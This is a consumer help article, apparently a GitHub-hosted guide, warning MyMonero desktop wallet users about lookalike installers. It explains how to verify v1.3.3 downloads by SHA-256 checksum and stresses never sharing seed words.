<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Fake Download Warning: Verify Before Installing</h1>
<p align="center">Find the final desktop packages safely, check file integrity, and avoid lookalike installers.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
The final MyMonero desktop release is v1.3.3 on the monero-projects GitHub repository, with Windows .exe, macOS .dmg, and Linux .zip packages. Use that release source and compare a downloaded file’s SHA-256 with the value published there before opening it.

## You'll see this if
- A search result or message offers a newer MyMonero desktop version.
- A download page asks you to enter your seed before providing an installer.
- You receive an “urgent update” link from an unknown account.
- A checksum shown for your file does not match the GitHub release value.
- A helper asks for remote access to install or “verify” your wallet.

## Why it happens
Lookalike pages and unsolicited files can imitate trusted software. A familiar logo or filename is not enough to establish that a download is authentic. MyMonero’s final desktop release is v1.3.3, available through the monero-projects GitHub release source. The old app still opens wallets and sends XMR, but is no longer maintained and receives no new features or security updates. Hosted servers and web-wallet login stopped. An offer claiming to restore hosted login or provide a newer official build should be treated cautiously.

A SHA-256 comparison is an integrity check: calculate the file’s hash and compare it exactly with the value on the release page. It can reveal a mismatch. It does not certify every property of the program, keep it maintained, or make an unknown page trustworthy. For detailed instructions, see [verify MyMonero download SHA-256](./verify-mymonero-download-sha256.md).

You should never need to enter a seed to download an installer. MyMonero seeds may have 13 MyMonero-specific legacy words or 25 standard Monero words. Those words are recovery information and must remain private. Nobody legitimate asks for your seed. For related protection against pressure tactics, see [MyMonero migration scams](./mymonero-migration-scams.md).

---

## Fix
1. **Do not run a suspicious file.** If a download arrived through a message, advertisement, or unknown page, leave it unopened. Do not let urgency or a claimed account shutdown override source verification.
2. **Navigate to the project release independently.** Use the [MyMonero v1.3.3 release page on GitHub](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3). The project repository is [monero-projects MyMonero desktop wallet](https://github.com/monero-projects/mymonero-desktop-wallet). Confirm you are looking at the project and release rather than a copied landing page.
3. **Choose the correct package type.** The final release offers a Windows .exe, macOS .dmg, and Linux .zip. Do not install a file labeled for a different operating system. The product has no newer maintained desktop release according to the facts in this guide.
4. **Find the published SHA-256 on the release page.** Compare the complete value there with the result for the exact downloaded file. Do not copy a checksum from an unrelated mirror or a message. This guide does not provide checksum values; retrieve the relevant one directly from the release page.
5. **Calculate the local hash.** On Windows, run `certutil -hashfile <file> SHA256`. On macOS, use `shasum -a 256 <file>`. On Linux, use `sha256sum <file>`. Replace `<file>` with the file path. Compare the output to the release-page value character by character; no need to post the value publicly.
6. **Stop if values differ or source is unclear.** Do not open a mismatched package, even if the filename looks correct. Obtain a fresh copy from the release page and calculate again. If you cannot confirm the source, do not use it.
7. **Handle operating-system prompts carefully.** For the specified macOS block, right-click the app and choose Open—but only when you have verified the file source. Do not disable broad protections or install an unknown “security fix.” See [Mac says MyMonero cannot be opened](./mymonero-macos-cannot-be-opened.md).

> [!TIP]
> Keep the release page and the downloaded file separate in your mind: a correct filename is not verification, while a matching SHA-256 is a check against the published file value.

---

## If that did not work
If a file fails the checksum comparison, do not run it or try to repair it with a tool from the same source. Delete or quarantine it using your normal device practices, then obtain a fresh package only from the GitHub release. Do not enter recovery words into the download page or its supposed support form.

If you have already opened a suspicious installer, avoid entering your seed into the app or any follow-up webpage. Do not share the seed with someone offering to inspect the device. Keep a secure backup and seek general, trusted device guidance without exposing wallet secrets. A download concern alone does not tell you whether funds were affected.

The desktop app’s maintenance limitation remains relevant even after a successful checksum: v1.3.3 is final, the app still opens wallets and sends XMR, and it receives no new features or security updates. Your options are to continue using it with that limitation or restore your seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. See [is MyMonero safe?](./is-mymonero-safe.md) and [the migration checklist](./mymonero-migration-checklist.md).

> [!WARNING]
> No legitimate download or support process needs your seed. Do not provide words, private keys, wallet files, or remote device access to a person who contacted you unexpectedly.

---

## Prevention
Get desktop packages from the monero-projects GitHub release source and check the hash each time you download. Avoid advertisements, unofficial “latest version” pages, and direct-message attachments. The old app is no longer maintained, so be skeptical of claims that an unknown download is a new official update.

Keep your seed backup private and offline. A download page should not ask for recovery words. Nobody legitimate asks for your seed, including during a migration, installation, checksum check, or error-code diagnosis. For safe backup practices, read [MyMonero backup seed safely](./mymonero-backup-seed-safely.md).

Learn the difference between a wallet restore and a sweep before accepting instructions. Restoring uses a seed to access a wallet; sweeping sends all funds to a new wallet. A fake download warning does not automatically mean you must transfer funds. Consider MyMonero fake download and scam FAQs for a broader overview.

## FAQ
<details><summary>What is the final desktop version?</summary>

MyMonero desktop’s final release is v1.3.3. It is no longer maintained and has no new features or security updates.

</details>

<details><summary>Does a matching checksum guarantee the app is safe?</summary>

It checks that the file matches the SHA-256 published on the release page. It does not guarantee maintenance, device security, or every property of the software.

</details>

<details><summary>Why does a download ask for my seed?</summary>

It should not. Do not provide the seed; nobody legitimate asks for it to download or verify an installer.

</details>

<details><summary>What should I do if the checksum differs?</summary>

Do not open the file. Get a fresh package from the GitHub release source and compare its hash with the published value again.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero FAQ: Desktop Status, Recovery, and Safety](./mymonero-faq.md) | Clear answers to common questions about the final desktop release, wallet access, seeds, and migration. |
| [MyMonero Shutdown Facts: What Is and Is Not Known](./mymonero-shutdown-facts.md) | Separate confirmed product status from uncertain dates and details, and plan next steps without panic. |
| [Is MyMonero Safe? Practical Considerations](./is-mymonero-safe.md) | Understand the desktop app’s maintenance status, protect your seed, and assess choices without absolute promises. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
